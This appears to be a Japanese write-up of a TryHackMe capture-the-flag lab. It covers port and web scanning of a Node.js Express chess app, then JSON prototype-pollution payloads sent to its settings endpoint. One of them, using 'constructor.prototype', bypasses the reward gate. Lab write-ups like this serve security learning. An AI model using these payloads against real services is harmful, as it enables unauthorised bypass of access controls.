# Fools Mate, Revenge CTF

https://tryhackme.com/room/foolsm8v2

[RevengeではないEasyのチャレンジ](https://tryhackme.com/room/foolsmate)は、クライアント側のコードを変更するだけなので省略。

## Enumeration

```shell
TARGET=10.146.136.13
sudo bash -c "echo $TARGET   fools.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```sh
root@ip-10-146-86-163:~# nikto -p 3000 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.189.198
+ Target Hostname:    fools.thm
+ Target Port:        80
+ Start Time:         2026-07-03 23:17:15 (GMT0)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/996 0x19e818ea5f0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 1707 items checked: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2026-07-03 23:17:19 (GMT0) (4 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## チェス

チェックメイトすると、下記応答が返る。

```json
{"ok":true,"move":"a1a8","fen":"R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1","status":"checkmate","turn":"b","winner":"white","locked":true,"message":"Checkmate! No reward for you.","reason":"reward gate closed: session.config.unlocked is not set"}
```

この文言に注目する。

```
reward gate closed: session.config.unlocked is not set
```

設定変更の機能を実行すると、下記の動作。

リクエスト

```json
{"theme":"forest","pieceSet":"classic","animationMs":0}
```

レスポンス

```json
{"ok":true,"preferences":{"theme":"forest","pieceSet":"classic","animationMs":0}}
```

プロトタイプ汚染を試したが効果なかった。

```json
{"theme":"forest","pieceSet":"classic","animationMs":0,
"__proto__": {
    "config": {
      "unlocked": true
    }
  }
}
```

いろいろ試していたらこのエラーが出た。deepMergeという関数で再帰で無限ループに陥っている。状態が壊れたのでサーバーをリセット。

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 0,
  "constructor": {
    "prototype": {
      "unlocked": true
    }
  }
}
```

```
RangeError: Maximum call stack size exceeded<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:28:19)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)<br> &nbsp; &nbsp;at deepMerge (/opt/ctf/chess-e2/server.js:33:7)
```

下記は失敗。

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 0,
  "constructor": {
    "prototype.config.unlocked": true
  }
}
```

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 0,
  "constructor.prototype.config.unlocked": true
}
```

下記で成功。無限ループになったペイロードの、trueを文字列に変更しただけ。

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 0,
  "constructor": {
    "prototype": {
      "unlocked": "test"
    }
  }
}
```

## 振り返り

- プロトタイプ汚染は久しぶりで記憶が薄れていたので良い復習になった。
- bool値でうまくいかず文字列にすると成功したのは、deepMerge の実装で true が Object と判定されていたのではないかと推測。

## Tags

#tags:プロトタイプ汚染 #tags:Node.js
